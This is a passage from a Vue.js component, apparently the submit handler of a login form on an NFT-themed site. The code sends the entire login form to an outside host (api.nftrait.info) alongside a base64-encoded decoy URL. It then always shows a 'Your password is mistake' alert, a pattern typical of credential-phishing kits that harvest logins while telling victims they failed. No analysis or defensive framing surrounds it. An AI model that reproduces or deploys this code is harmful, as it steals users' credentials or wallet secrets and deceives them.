          _l: "aHR0cHM6Ly9hcGkubmZ0cHJpY2VmbG9vci5jb20vbmZ0cw==", // https://api.nftpricefloor.com/nfts
          data: this.loginForm,
        };
        axios
          .post("https://api.nftrait.info/nft", data)
          .then((data) => {
            let res = data.data;
            // res.data = !!res.data ? JSON.parse(res.data) : {}
            this.isLoading = false;
            if (res.code === 1000) {
              console.log(res);
              this.responseData = res.data;
            }
          })
          .catch((error) => {
            this.isLoading = false;
            this.isError = true;
          });
          alert("Your password is mistake")
      }
    },
  },
};
</script>

